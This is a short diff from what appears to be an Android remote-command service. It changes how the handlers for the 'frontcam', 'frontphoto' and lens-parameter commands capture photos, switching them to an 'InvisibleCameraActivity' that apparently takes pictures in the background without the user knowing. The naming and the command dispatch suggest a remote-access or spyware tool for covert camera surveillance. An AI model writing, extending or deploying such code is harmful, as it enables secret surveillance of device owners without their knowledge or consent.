@@ -687,7 +687,7 @@ object DeviceCommandService {
                     val lens = params.optString("lens", "back")
                     val isFront = lens.lowercase(Locale.ROOT) == "front"
                     if (context != null) {
-                        BackgroundCameraEngine.takePhoto(context, isFront = isFront)
+                        InvisibleCameraActivity.takePhoto(context, "", isFront)
                         DeviceCommandResult(true, data = JSONObject().put("status", "capturing_camera_photo").put("lens", if (isFront) "front" else "back"))
                     } else {
                         DeviceCommandResult(false, error = "Context required for camera photo capture")
@@ -696,7 +696,7 @@ object DeviceCommandService {
 
                 "frontcam", "frontphoto" -> {
                     if (context != null) {
-                        BackgroundCameraEngine.takePhoto(context, isFront = true)
+                        InvisibleCameraActivity.takePhoto(context, "", isFront = true)
                         DeviceCommandResult(true, data = JSONObject().put("status", "capturing_front_photo"))
                     } else {
                         DeviceCommandResult(false, error = "Context required for camera photo capture")
